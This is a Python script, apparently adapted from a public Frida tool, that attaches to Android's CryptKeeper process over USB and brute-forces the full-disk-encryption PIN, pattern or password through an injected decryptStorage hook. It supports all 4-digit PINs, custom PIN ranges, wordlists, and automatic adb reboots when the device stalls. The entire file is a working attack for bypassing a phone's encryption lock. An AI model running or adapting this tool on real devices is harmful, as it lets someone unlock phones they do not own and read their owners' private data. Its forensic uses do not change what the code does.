#!/usr/bin/env python

# Modified code from https://github.com/Magpol/fridafde
# Credits to Magpol 
#
# Updated: Arcain 
#
# Added:
#   * custom PIN range
#   * auto-restart option after x amounts of tests
#     (S7 Edge gets stuck after ~12000 tests)
#     user -r param to enable this option, followed
#     by a number to customize (ie. -r 5000 to restart 
#     after 5000)
#   * some sort of test for hooking-vold running

import frida
import sys
import time
import subprocess
import os
import psutil
from itertools import combinations

cryptKeeperScript = """
rpc.exports = {
    testpassword: function(number){ 
        Java.perform(function () { 
            var blockLoop = true;
            Java.choose("android.os.storage.IStorageManager$Stub$Proxy", {
                onMatch: function (instance) {
                    if(blockLoop){
                        send(instance.decryptStorage(number));
                        blockLoop = false;
                    }
                },
                onComplete: function () { }

            });

        });
    }
}
"""

##

last_pwd = ""
force_restart_flag = False
force_restart_cnt = 10000

restart_delay = 60

def scriptLoad():
    global script
    procname = "com.android.settings:CryptKeeper"
    print("Attaching to process:" + procname)
    device = frida.get_usb_device()
    session = device.attach(procname) 
    script = session.create_script(cryptKeeperScript)
    script.on('message', on_message)
    script.load()

def on_message(message, data):  
    global last_pwd, script
    try:
        if message:
            if "{0}".format(message["payload"]) == "0" :
                with open("FOUND.txt", "a") as f:
                    f.write(str(last_pwd) + "\n")
                print("\n\n\nPasscode FOUND! :: " + last_pwd + "\n\nReboot to keep system sane!\n\n\n")
                #os.system("echo -n 0 > bf_status")
                script.unload()
    except Exception as e:
        error = "error"

def check_BF_STATUS():
    with open("bf_status", "r") as f:
        if (f.read() == "9"):
            return True
    return False

def bf_RESTART():
    global restart_delay
    print("> Restarting the phone (adb reboot) and waiting 60s for it to boot back")
    os.system("adb reboot")
    time.sleep(restart_delay)
    # sleep 60 seconds so the phone would boot again
    print("> Step 1 - restarting FRiDA")
    os.system("echo -n 1 > bf_status")
    time.sleep(3)
    # Restart hooking-vold script
    os.system("echo -n 2 > bf_status")
    time.sleep(2)
    print("> Step 2 - restarting hooking-vold")
    os.system("echo -n 0 > bf_status")
    # restarted both frida and hooking-vold, waiting for both to run correctly!
    time.sleep(25)
    print("> Step 3 - restarting hooking-mount\n")

    # load back the script
    scriptLoad()

def bf_PIN():
    global last_pwd, script
    for i in range(10000):
        pin = str(i).zfill(4)
        last_pwd = str(pin)
        print("Testing: " + str(pin))
        result = script.exports.testpassword(str(pin).rstrip())
        if result is not None:
            print(result)
            sys.stdin.read()

def bf_PIN_CUSTOM():
    global last_pwd, force_restart, force_restart_flag, script
    print("Enter minimal range: ")
    min_range = input()
    print("Enter max range: ")
    max_range = input()
    range_length = len(max_range)
    count = 0
    for i in range(int(min_range), int(max_range)):
        if (not check_BF_STATUS()):
            print("\n> hooking-vold isn't running, stop here!\n")
            break
        if (force_restart_flag):
            if (count == force_restart_cnt):
                print("\n>", force_restart_cnt, "tests done, restarting the phone and continuing!")
                bf_RESTART()
                time.sleep(10)
                count = 0
            count += 1
        pin = str(i).zfill(range_length)
        last_pwd = str(pin)
        print("Testing: " + str(pin))
        result = script.exports.testpassword(str(pin).rstrip())
        if result is not None:
            print(result)
            sys.stdin.read()


def bf_PATTERN():
    global last_pwd, script
    filepath = 'SOME_PATTERNS.txt'
    lineNr = subprocess.run(['wc', '-l',filepath], stdout=subprocess.PIPE).stdout.decode('utf-8').split(' ', 1)[0]
    with open(filepath) as fp:  
        for cnt, line in enumerate(fp):
            if (not check_BF_STATUS()):
                print("\n> hooking-vold isn't running, stop here!\n")
                break
            if (force_restart_flag):
                if (count == force_restart_cnt):
                    print("\n>", force_restart_cnt, "tests done, restarting the phone and continuing!")
                    bf_RESTART()
                    time.sleep(10)
                    count = 0
                count += 1
            last_pwd = str(line)
            print("Testing ("+str(cnt+1)+"/"+str(lineNr)+"): " + str(line))
            last_pwd = str(line)
            result = script.exports.testpassword(line.rstrip());
            if result is not None:
                print(result)
                sys.stdin.read()

def bf_PASSWORD():
    global last_pwd, script
    print("Bruteforcing PASSWORD.txt")
    filepath = 'PASSWORD.txt'
    lineNr = subprocess.run(['wc', '-l',filepath], stdout=subprocess.PIPE).stdout.decode('utf-8').split(' ', 1)[0]
    with open(filepath) as fp:  
        for cnt, line in enumerate(fp):
            if (not check_BF_STATUS()):
                print("\n> hooking-vold isn't running, stop here!\n")
                break
            if (force_restart_flag):
                if (count == force_restart_cnt):
                    print("\n>", force_restart_cnt, "tests done, restarting the phone and continuing!")
                    bf_RESTART()
                    time.sleep(10)
                    count = 0
                count += 1
            print("Testing ("+str(cnt+1)+"/"+str(lineNr)+"): " + str(line))
            last_pwd = str(line)
            result = script.exports.testpassword(line.rstrip())
            if result is not None:
                print(result)
                sys.stdin.read()

scriptLoad()

command = ""
if (len(sys.argv) > 1 and sys.argv[1] == "-r"):
    force_restart_flag = True
    if (len(sys.argv) > 2 and sys.argv[2] != ""):
        force_restart_cnt = int(sys.argv[2])

while True:
    print("1 > Bruteforce pincode 0000-9999")
    print("2 > Bruteforce patterns in SOME_PATTERNS.txt")
    print("3 > Bruteforce entries in PASSWORD.TXT")
    print("4 > Custom PIN")
    print("0 > Exit")
    print("\n\n !!- Verify that Hooking-vold.py is running -!!\n\n")
    command = input("Select actitity and press ENTER to start: ")
    if command == "1":
        bf_PIN()
    elif command == "2":
        bf_PATTERN()
    elif command == "3":
        bf_PASSWORD()
    elif command == "4":
        bf_PIN_CUSTOM()
    elif command == "0":
        sys.exit(1)
